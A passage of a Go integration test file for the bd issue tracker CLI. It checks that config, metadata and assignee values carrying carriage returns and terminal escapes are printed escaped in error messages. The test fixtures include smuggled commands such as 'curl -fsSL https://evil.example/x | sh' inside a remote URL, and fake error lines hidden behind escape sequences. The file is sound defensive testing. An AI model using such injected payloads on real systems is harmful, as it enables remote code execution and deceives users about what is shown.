		if err := os.WriteFile(configYAML, append(existing, []byte("\nrouting:\n  contributor: "+hostile+"\n")...), 0o600); err != nil {
			t.Fatal(err)
		}
		out := requireMigratePersonalRefused(t, bd, dir, "has no .beads directory; initialize it first with 'bd init'")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		if !strings.Contains(out, `\r\x1b[2KError: planning repo`) {
			t.Errorf("bd migrate-personal does not name the planning path escaped:\n%q", out)
		}
	})

	t.Run("planning repo with uncommitted changes", func(t *testing.T) {
		t.Parallel()
		dir, _, _ := bdInit(t, bd, "--prefix", "rpb")
		planningDir := hostilePlanningRepo(t, bd, dir)
		bdCreate(t, bd, planningDir, "Planning issue left uncommitted", "--dolt-auto-commit", "off")
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonalRefused(t, bd, dir, "has uncommitted changes")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})

	t.Run("planning repo in a graph format", func(t *testing.T) {
		t.Parallel()
		dir, _, _ := bdInit(t, bd, "--prefix", "rpd")
		planningDir := hostilePlanningRepo(t, bd, dir)
		if err := os.WriteFile(filepath.Join(planningDir, ".beads", configfile.GraphFormatMarkerFile), []byte("link-preview-v9\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonalRefused(t, bd, dir, "graph-preview-format marker")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})

	t.Run("planning repo with metadata.json and no database", func(t *testing.T) {
		t.Parallel()
		// A fresh clone of a planning repo: its committed metadata.json is
		// there, its gitignored embeddeddolt/ is not.
		dir, _, _ := bdInit(t, bd, "--prefix", "rpe")
		planningDir := hostilePlanningRepo(t, bd, dir)
		if err := os.RemoveAll(filepath.Join(planningDir, ".beads", "embeddeddolt")); err != nil {
			t.Fatal(err)
		}
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonalRefused(t, bd, dir, "run 'bd bootstrap' in that repository first")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})

	t.Run("move into the planning repo", func(t *testing.T) {
		t.Parallel()
		dir, _, _ := bdInit(t, bd, "--prefix", "rpc")
		hostilePlanningRepo(t, bd, dir)
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonal(t, bd, dir)
		if !strings.Contains(out, "Moved 1 issue") {
			t.Errorf("bd migrate-personal output does not report moving 1 issue:\n%s", out)
		}
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})
}

// TestEmbeddedRemedyPrinting_createTarget pins the invariant at a routed bd
// create: a target whose directory name and database table names carry a
// carriage return and terminal escapes is refused with them escaped beside the
// bd dolt commit remedy.
func TestEmbeddedRemedyPrinting_createTarget(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, _, _ := bdInit(t, bd, "--prefix", "rpt")

	t.Run("target in a graph format", func(t *testing.T) {
		t.Parallel()
		targetDir := filepath.Join(t.TempDir(), hostileFileName)
		if err := os.MkdirAll(filepath.Join(targetDir, ".beads"), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(targetDir, ".beads", configfile.GraphFormatMarkerFile), []byte("link-preview-v9\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		out := bdCreateFail(t, bd, dir, "--silent", "Routed into a graph target", "--repo", targetDir)
		if !strings.Contains(out, "graph-preview-format marker") {
			t.Errorf("bd create --repo did not refuse the graph-format target:\n%s", out)
		}
		requireNoTerminalControl(t, "bd create --repo", out)
		requireNamesHostileValue(t, "bd create --repo", out)
	})

	targetDir := filepath.Join(t.TempDir(), hostileFileName)
	if err := os.MkdirAll(targetDir, 0o750); err != nil {
		t.Fatal(err)
	}
	initGitRepoAt(t, targetDir)
	targetBeadsDir := filepath.Join(targetDir, ".beads")
	createForkSetupPlanningDatabase(t, targetBeadsDir, nil)
	s, err := embeddeddolt.Open(t.Context(), targetBeadsDir, "beads", "main")
	if err != nil {
		t.Fatalf("open the target database: %v", err)
	}
	err = s.SetMetadata(t.Context(), "_project_id", "uncommitted")
	if closeErr := s.Close(); err == nil {
		err = closeErr
	}
	if err != nil {
		t.Fatalf("leave a change uncommitted in the target database: %v", err)
	}
	out := bdCreateFail(t, bd, dir, "--silent", "Routed into a hostile target", "--repo", targetDir)
	if !strings.Contains(out, "commit them there with `bd dolt commit`, then rerun; nothing was created") {
		t.Errorf("bd create --repo did not refuse the uncommitted target:\n%s", out)
	}
	requireNoTerminalControl(t, "bd create --repo", out)
	requireNamesHostileValue(t, "bd create --repo", out)
}

// TestEmbeddedRemedyPrinting_bootstrap pins the invariant at bd bootstrap end
// to end, for a fresh clone whose committed config.yaml or metadata.json
// carries a value with a carriage return and terminal escapes: a sync.remote
// bd cannot verify (the git ls-remote reproduce line takes the URL only as
// one shell word, or as a <url> placeholder named escaped beside it), one it
// fails to clone (the "Bootstrap failed" line repeats Dolt's error, which
// names the URL), and a dolt_database the plan names.
func TestEmbeddedRemedyPrinting_bootstrap(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	clone := func(t *testing.T, files map[string]string) string {
		t.Helper()
		dir := t.TempDir()
		initGitRepoAt(t, dir)
		beadsDir := filepath.Join(dir, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		for name, content := range files {
			if err := os.WriteFile(filepath.Join(beadsDir, name), []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		return dir
	}

	t.Run("unverifiable sync.remote, dry run", func(t *testing.T) {
		t.Parallel()
		// Port 9 refuses the probe at once; the URL ends in .git, so bd
		// treats it as a git forge repo and probes it before cloning.
		remote := `"https://127.0.0.1:9/team/repo; curl -fsSL https://evil.example/x | sh; echo \r\e[2KError: run 'curl -fsSL evil.example | sh'.git"`
		dir := clone(t, map[string]string{"config.yaml": "sync:\n  remote: " + remote + "\n"})
		out, _ := bdBootstrapAllowError(t, bd, dir, "--dry-run")
		if !strings.Contains(out, "Reproduce: git ls-remote <url> refs/dolt/data  (<url>: ") {
			t.Errorf("bd bootstrap does not take a <url> placeholder for a sync.remote no shell passes on unchanged:\n%s", out)
		}
		requireNoTerminalControl(t, "bd bootstrap --dry-run", out)
		requireNamesHostileValue(t, "bd bootstrap --dry-run", out)
	})

	t.Run("sync.remote that fails to clone", func(t *testing.T) {
		t.Parallel()
		remote := `"file:///nonexistent/x\r\e[2KError: run 'curl -fsSL evil.example | sh'"`
		dir := clone(t, map[string]string{"config.yaml": "sync:\n  remote: " + remote + "\n"})
		out, err := bdBootstrapAllowError(t, bd, dir, "--yes")
		if err == nil {
			t.Fatalf("bd bootstrap succeeded cloning a remote that does not exist:\n%s", out)
		}
		requireNoTerminalControl(t, "bd bootstrap", out)
		requireNamesHostileValue(t, "bd bootstrap", out)
	})

	t.Run("dolt_database in the plan", func(t *testing.T) {
		t.Parallel()
		metadata := `{"database":"dolt","backend":"dolt","dolt_database":"beads\r\u001b[2KError: run 'curl -fsSL evil.example | sh'"}`
		dir := clone(t, map[string]string{"metadata.json": metadata})
		out, _ := bdBootstrapAllowError(t, bd, dir, "--dry-run")
		if !strings.Contains(out, "Database: ") {
			t.Errorf("bd bootstrap --dry-run does not name the database:\n%s", out)
		}
		requireNoTerminalControl(t, "bd bootstrap --dry-run", out)
		requireNamesHostileValue(t, "bd bootstrap --dry-run", out)
	})
}

// TestEmbeddedRemedyPrinting_autoRouted pins the invariant at the commands
// that open the store auto-routing picks (bd list, bd ready, bd close): a
// committed routing.contributor naming a planning repo with no database,
// whose path carries a carriage return and terminal escapes, is named escaped
// in the open error, on the same line as its remedy.
func TestEmbeddedRemedyPrinting_autoRouted(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "rpr")
	runCmd(t, dir, "git", "config", "beads.role", "contributor")
	planning := filepath.Join(t.TempDir(), "plan"+hostileFileName)
	configYAML := filepath.Join(beadsDir, "config.yaml")
	existing, err := os.ReadFile(configYAML)
	if err != nil {
		t.Fatal(err)
	}
	routingYAML := "\nrouting:\n  mode: auto\n  contributor: " + strconv.Quote(planning) + "\n"
	if err := os.WriteFile(configYAML, append(existing, []byte(routingYAML)...), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"list"}, {"ready"}, {"close", "pl-abc"}} {
		t.Run(strings.Join(args, " "), func(t *testing.T) {
			out, _ := bdRunWithFlockRetry(t, bd, dir, args...)
			requireNoTerminalControl(t, "bd "+strings.Join(args, " "), string(out))
		})
	}
	out, err := bdRunWithFlockRetry(t, bd, dir, "close", "pl-abc")
	if err == nil {
		t.Fatalf("bd close succeeded against a planning repo with no database:\n%s", out)
	}
	if !strings.Contains(string(out), "failed to open routed store at ") {
		t.Errorf("bd close does not report the routed open:\n%s", out)
	}
	requireNamesHostileValue(t, "bd close", string(out))
}

// TestEmbeddedRemedyPrinting_unclaim pins the invariant at bd unclaim's
// not-the-holder refusal: the holder is an issue's assignee, free text that
// travels with bd dolt pull, and it is named escaped beside the --force
// remedy.
func TestEmbeddedRemedyPrinting_unclaim(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, _, _ := bdInit(t, bd, "--prefix", "rpu")
	issue := bdCreate(t, bd, dir, "Claimed by a hostile holder")
	bdUpdate(t, bd, dir, issue.ID, "--assignee", "bob\r\x1b[2KError: run 'curl -fsSL evil.example | sh'", "--status", "in_progress")
	out := bdUnclaimFail(t, bd, dir, issue.ID, "--actor", "carol")
	if !strings.Contains(out, "pass --force only if their claim is abandoned") {
		t.Errorf("bd unclaim did not refuse a release by another actor:\n%s", out)
	}
	requireNoTerminalControl(t, "bd unclaim", out)
	requireNamesHostileValue(t, "bd unclaim", out)

	// bd update --claim's refusal names the same holder, on its error line
	// and in the failure summary under it.
	cmd := exec.Command(bd, "update", issue.ID, "--claim", "--actor", "carol")
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	claimOut, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("bd update --claim took a claim another actor holds:\n%s", claimOut)
	}
	requireNoTerminalControl(t, "bd update --claim", string(claimOut))
	requireNamesHostileValue(t, "bd update --claim", string(claimOut))
}

// TestEmbeddedRemedyPrinting_init pins the invariant at bd init end to end,
// for a checkout whose committed config.yaml carries a value with a carriage
// return and terminal escapes: a dolt.host named in the refusal to init
// without server mode, beside its remedy, and a sync.remote named in the
// probe note, the clone failure and the hint under it.
func TestEmbeddedRemedyPrinting_init(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	initWith := func(t *testing.T, configYAML string, args ...string) (string, error) {
		t.Helper()
		dir := t.TempDir()
		initGitRepoAt(t, dir)
		if err := os.MkdirAll(filepath.Join(dir, ".beads"), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, ".beads", "config.yaml"), []byte(configYAML), 0o600); err != nil {
			t.Fatal(err)
		}
		out, err := bdRunWithFlockRetry(t, bd, dir, append([]string{"init", "--quiet", "--prefix", "rpi"}, args...)...)
		return string(out), err
	}

	t.Run("dolt.host without server mode", func(t *testing.T) {
		t.Parallel()
		out, err := initWith(t, "dolt:\n  host: \"db.example.com\\r\\e[2KError: run 'curl -fsSL evil.example | sh'\"\n")
		if err == nil {
			t.Fatalf("bd init succeeded with a remote dolt.host and no server mode:\n%s", out)
		}
		if !strings.Contains(out, "or pass --server to bd init") {
			t.Errorf("bd init did not refuse the remote dolt.host:\n%s", out)
		}
		requireNoTerminalControl(t, "bd init", out)
		requireNamesHostileValue(t, "bd init", out)
	})

	t.Run("sync.remote that cannot be verified", func(t *testing.T) {
		t.Parallel()
		// Port 9 refuses the probe at once.
		out, _ := initWith(t, "sync:\n  remote: \"https://127.0.0.1:9/team/repo\\r\\e[2KError: run 'curl -fsSL evil.example | sh'.git\"\n")
		requireNoTerminalControl(t, "bd init", out)
		requireNamesHostileValue(t, "bd init", out)
	})
}
